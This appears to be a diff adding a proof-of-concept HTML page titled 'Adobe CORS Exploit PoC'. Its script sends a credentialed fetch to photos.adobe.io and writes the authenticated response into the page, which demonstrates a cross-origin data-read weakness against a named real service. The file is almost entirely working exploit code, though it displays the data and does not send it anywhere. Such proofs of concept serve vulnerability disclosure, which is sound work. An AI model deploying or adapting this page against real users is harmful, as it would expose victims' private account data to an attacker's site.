@@ -1,0 +1,15 @@
+<!-- PoC HTML file -->
+<html>
+  <body>
+    <h2>Adobe CORS Exploit PoC</h2>
+    <script>
+      fetch("https://photos.adobe.io/", {
+        credentials: "include"
+      })
+      .then(response => response.text())
+      .then(data => {
+        document.body.innerHTML = "<pre>" + data + "</pre>";
+      });
+    </script>
+  </body>
+</html>
